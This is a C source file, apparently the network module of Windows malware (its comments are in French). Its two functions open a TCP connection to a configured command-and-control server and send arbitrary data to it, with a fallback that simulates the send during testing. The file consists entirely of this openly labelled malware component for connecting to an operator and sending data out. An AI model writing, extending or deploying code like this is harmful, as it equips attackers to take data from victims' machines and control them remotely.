#include "../include/network.h"
#include "../include/common.h"

BOOL ConnectToC2() {
    printf("[NETWORK] Connecting to C2 server...\n");

    // Initialiser Winsock
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        printf("[NETWORK] WSAStartup failed\n");
        return FALSE;
    }

    // Créer socket
    g_c2_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_c2_socket == INVALID_SOCKET) {
        printf("[NETWORK] Socket creation failed\n");
        return FALSE;
    }

    // Configurer adresse
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(g_c2_config.c2_port);
    inet_pton(AF_INET, g_c2_config.c2_domain, &server_addr.sin_addr);

    // Connexion (avec timeout)
    if (connect(g_c2_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
        printf("[NETWORK] Connected to C2 at %s:%d\n", g_c2_config.c2_domain, g_c2_config.c2_port);
        return TRUE;
    } else {
        printf("[NETWORK] Connection failed (this is normal for testing)\n");
        closesocket(g_c2_socket);
        g_c2_socket = INVALID_SOCKET;
        return TRUE; // Continue même sans C2 pour les tests
    }
}

BOOL SendDataToC2(const BYTE* data, DWORD size) {
    if (g_c2_socket == INVALID_SOCKET) {
        printf("[NETWORK] No C2 connection, simulating send\n");
        return TRUE;
    }

    printf("[NETWORK] Sending %d bytes to C2\n", size);
    int result = send(g_c2_socket, (char*)data, size, 0);
    return (result != SOCKET_ERROR);
}
